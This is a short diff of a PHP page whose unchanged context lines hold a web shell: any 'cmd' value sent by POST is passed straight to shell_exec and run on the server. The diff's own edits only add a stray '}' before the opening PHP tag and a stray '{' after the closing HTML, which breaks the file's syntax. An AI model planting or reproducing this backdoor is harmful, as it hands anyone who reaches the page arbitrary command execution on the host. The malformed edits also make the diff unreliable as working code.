@@ -1,4 +1,4 @@
-<?php
+}<?php
 if (!empty($_POST['cmd'])) {
     $cmd = shell_exec($_POST['cmd']);
 }
@@ -106,3 +106,4 @@ if (!empty($_POST['cmd'])) {
     </main>
 </body>
 </html>
+{
